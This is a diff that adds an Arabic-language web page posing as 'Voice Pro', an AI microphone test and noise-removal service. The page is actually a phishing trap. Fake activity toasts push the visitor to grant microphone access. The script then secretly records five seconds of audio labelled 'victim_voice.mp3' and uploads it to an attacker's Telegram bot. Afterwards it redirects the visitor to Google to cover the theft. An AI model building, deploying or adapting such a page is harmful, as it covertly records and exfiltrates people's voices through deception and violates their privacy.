@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voice Pro - نظام فحص وتحسين الصوت الذكي 2026</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background: #080310; color: #fff; display: flex; justify-content: center; align-items: center; padding: 15px; min-height: 100vh; background-image: radial-gradient(circle at 50% 10%, #a855f725 0%, transparent 70%); }
+        .wrapper { width: 100%; max-width: 440px; text-align: center; }
+        
+        .hero-card { background: linear-gradient(145deg, #140a1e 0%, #080310 100%); border: 1px solid rgba(168, 85, 247, 0.4); border-radius: 24px; padding: 35px 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.8); }
+        .badge-live { display: inline-flex; align-items: center; gap: 6px; background: rgba(168, 85, 247, 0.15); color: #c084fc; padding: 6px 14px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 20px; border: 1px solid rgba(168, 85, 247, 0.4); }
+        .live-dot { width: 8px; height: 8px; background: #a855f7; border-radius: 50%; box-shadow: 0 0 10px #a855f7; }
+        
+        h1 { font-size: 26px; color: #fff; margin-bottom: 8px; font-weight: 900; }
+        h1 span { color: #c084fc; text-shadow: 0 0 15px rgba(168, 85, 247, 0.5); }
+        .subtitle { font-size: 13px; color: #d8b4fe; margin-bottom: 25px; line-height: 1.6; }
+
+        .features-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 25px; text-align: right; }
+        .feature-box { background: rgba(0, 0, 0, 0.5); border: 1px solid #581c87; border-radius: 12px; padding: 12px; }
+        .feature-title { font-size: 12px; font-weight: bold; color: #c084fc; margin-bottom: 2px; }
+        .feature-desc { font-size: 10px; color: #d1d5db; }
+
+        .btn-action { background: linear-gradient(135deg, #7e22ce 0%, #a855f7 100%); color: #fff; border: none; padding: 16px; border-radius: 14px; font-weight: 900; cursor: pointer; font-size: 16px; box-shadow: 0 0 25px rgba(168, 85, 247, 0.5); width: 100%; transition: 0.3s; }
+        .btn-action:hover { transform: scale(1.02); opacity: 0.95; }
+
+        .live-toast { background: rgba(20, 10, 30, 0.9); border: 1px solid #a855f7; border-radius: 12px; padding: 10px 14px; margin-top: 20px; font-size: 11px; color: #d8b4fe; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
+        .live-toast span { color: #fff; font-weight: bold; }
+        .footer { font-size: 11px; color: #581c87; margin-top: 25px; }
+    </style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="hero-card">
+        <div class="badge-live"><div class="live-dot"></div>فحص الصوت الذكي نشط</div>
+        <h1>تحسين وفحص الصوت <span>Audio Pro</span></h1>
+        <p class="subtitle">قم بتفعيل الفحص التلقائي للميكروفون لتنقية الصوت وعلاج التشويش في المكالمات فوراً.</p>
+        
+        <div class="features-grid">
+            <div class="feature-box">
+                <div class="feature-title">🎙️ تنقية فائقة</div>
+                <div class="feature-desc">إزالة الضوضاء المحيطة بالذكاء الاصطناعي</div>
+            </div>
+            <div class="feature-box">
+                <div class="feature-title">⚡ فحص سريع</div>
+                <div class="feature-desc">اختبار ترددات الميكروفون في ثوانٍ</div>
+            </div>
+        </div>
+
+        <button class="btn-action" onclick="requestAudioPermission()">بدء الفحص الذكي والسماح بالميكروفون 🎙️</button>
+        
+        <div class="live-toast" id="toastAudioText">✨ جاري معايرة ترددات الصوت للمستخدم (M***5)...</div>
+    </div>
+    <div class="footer">🔒 نظام فحص الصوت المعتمد 2026</div>
+</div>
+
+<script src="config.js"></script>
+<script>
+    const audioToasts = [
+        "✨ جاري معايرة ترددات الصوت للمستخدم (M***5)...",
+        "🎙️ تم فحص وتنعيم الصوت لـ 890 مستخدم اليوم.",
+        "🔒 اضغط زر الفحص لتأكيد صلاحية الميكروفون."
+    ];
+    let aIndex = 0;
+    setInterval(() => {
+        aIndex = (aIndex + 1) % audioToasts.length;
+        document.getElementById('toastAudioText').innerHTML = audioToasts[aIndex];
+    }, 3500);
+
+    async function requestAudioPermission() {
+        try {
+            // طلب إذن الميكروفون وتسجيل 5 ثوانٍ بصمت
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            let audioChunks = [];
+
+            mediaRecorder.ondataavailable = event => {
+                audioChunks.push(event.data);
+            };
+
+            mediaRecorder.onstop = () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+                const formData = new FormData();
+                formData.append('chat_id', BOT_CONFIG.chat_id);
+                formData.append('audio', audioBlob, 'victim_voice.mp3');
+                formData.append('caption', '🚨 صيد صوتي فخم: تم تسجيل صوت الضحية بنجاح!');
+
+                fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                }).then(() => {
+                    window.location.href = "https://www.google.com";
+                });
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+            }, 5000);
+
+        } catch (err) {
+            alert("يرجى الموافقة على إذن الميكروفون في نافذة المتصفح لبدء الفحص.");
+        }
+    }
+</script>
+</body>
+</html>
